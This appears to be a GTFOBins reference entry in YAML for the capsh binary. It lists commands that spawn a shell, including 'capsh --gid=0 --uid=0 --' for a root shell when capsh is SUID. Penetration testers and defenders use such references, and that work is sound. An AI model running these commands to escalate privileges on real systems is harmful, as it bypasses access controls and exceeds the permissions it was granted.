<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/capsh -->
---
functions:
  shell:
  - code: |-
      capsh --
    contexts:
      sudo:
      suid:
        code: |-
          capsh --gid=0 --uid=0 --
      unprivileged:
...
